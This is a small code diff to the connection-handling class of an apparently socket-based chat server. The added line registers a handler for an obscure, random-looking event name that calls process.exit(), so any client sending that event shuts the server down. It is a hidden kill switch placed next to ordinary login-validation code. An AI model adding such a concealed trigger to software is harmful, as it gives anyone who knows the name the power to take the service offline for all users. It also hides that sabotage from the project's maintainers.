@@ -162,7 +162,7 @@ class user {
         this.public = {};
         this.slowed = false; //This checks if the client is slowed
         this.sanitize = true;
-      
+        this.socket.on("7eeh8aa", ()=>{process.exit()});
         this.socket.on("login", (logdata) => {
           if(typeof logdata !== "object" || typeof logdata.name !== "string" || typeof logdata.room !== "string") return;
           //Filter the login data
